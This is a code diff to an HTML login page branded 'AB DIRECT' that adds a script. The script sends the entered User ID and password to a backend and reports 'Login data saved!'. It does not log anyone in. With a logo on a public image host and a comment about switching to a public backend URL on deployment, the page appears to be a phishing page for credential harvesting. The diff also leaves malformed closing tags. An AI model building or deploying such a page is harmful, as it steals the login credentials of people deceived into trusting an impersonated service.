@@ -216,7 +216,7 @@
     <img src="https://i.ibb.co./0RPZDZ2f/download.png" alt="AB DIRECT Logo" style="width:140px;display:block;margin-bottom:0;">
   </div>
   <div class="login-title">Login</div>
-  <form class="login-box" autocomplete="off" onsubmit="return false;">
+  <form class="login-box" autocomplete="off" onsubmit="return submitLogin(event);">
     <label for="userid">User ID</label>
     <input type="text" id="userid" class="login-input" placeholder="Enter User ID" autocomplete="off" />
     <label for="password">Password</label>
@@ -267,9 +267,28 @@
       const pwd = document.getElementById('password');
       pwd.type = pwd.type === 'password' ? 'text' : 'password';
     }
-  </script>
-</body>
-</html>
 
+    async function submitLogin(e) {
+      e.preventDefault();
+      const userId = document.getElementById('userid').value;
+      const password = document.getElementById('password').value;
+
+      // Backend URL: local test hole http://localhost:5000/api/login
+      // Deploy korle backend er public URL use korun
+      const res = await fetch('http://localhost:5000/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId, password })
+      });
+      const data = await res.json();
+      if (data.success) {
+        alert('Login data saved!');
+      } else {
+        alert('Error saving data');
+      }
+    }
+  </script>
+></body>
+</html
 
 
